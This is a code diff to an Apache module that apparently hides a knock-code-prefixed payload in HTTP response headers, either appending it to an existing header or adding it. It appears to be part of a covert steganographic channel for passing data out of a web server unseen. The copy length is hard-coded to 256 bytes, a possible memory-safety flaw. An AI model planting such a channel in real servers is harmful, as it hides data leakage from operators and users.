@@ -1,5 +1,6 @@
 #include "httpd.h"
 #include "http_config.h"
+#include "http_log.h"
 #include "apr_strings.h"
 #include "apr_global_mutex.h"
 #include "apr_shm.h"
@@ -74,24 +75,31 @@ void header_encoder(request_rec *r, steg_config *config, server_config *svr, cha
 
     char *x;
     char payload[PROTOCOL_MAX_PAYLOAD_SIZE];
-    //const char *header;
+    const char *originalheader, *injectedheader;
+
+    //Compute the payload: knockcode + length + data
+    apr_cpystrn(payload, config->knockcode, 256); //Knockcode
+    x = payload + strlen(config->knockcode);
+    x = int_to_string(x, strlen(data), PROTOCOL_LENGTH_SIZE); // Length  
+    apr_cpystrn(x, data, 256-strlen(config->knockcode)-PROTOCOL_LENGTH_SIZE); // Data
+
 
     // Get the value of the HTTP header
-    //header = apr_table_get(r->headers_out, config->outputmethodconfig);
-    //If the header is not already present, we just add it
-    //if (header == NULL){
-    //}else{
-    //} 
+    originalheader = apr_table_get(r->headers_out, config->outputmethodconfig);
+ 
+    //If the header is already present, we need to append the payload
+    if (originalheader != NULL){
+        injectedheader = apr_pstrcat(svr->pool, originalheader, payload, NULL);
+        apr_table_set(r->headers_out, config->outputmethodconfig, injectedheader);
 
-    //First part of the payload is the knockcode
-    apr_cpystrn(payload, config->knockcode, 256);
-    x = payload + strlen(config->knockcode);
-    //Then we append the length field
-    x = int_to_string(x, strlen(data), PROTOCOL_LENGTH_SIZE);  
-    // Then the data
-    apr_cpystrn(x, data, 256-strlen(config->knockcode)-PROTOCOL_LENGTH_SIZE);
+        //TESTING
+        ap_log_rerror(APLOG_MARK, APLOG_CRIT, (apr_status_t) 0, r, "Header already existed: %s", originalheader);    
 
-    //string_to_inject* = apr_palloc(svr->pool, strlen(original_header) + strlen(payload) )
-    apr_table_set(r->headers_out, config->outputmethodconfig, payload);
+    //If the header is not there, we just add it
+    }else{
+        apr_table_set(r->headers_out, config->outputmethodconfig, payload);
+    } 
+
+
 
 }
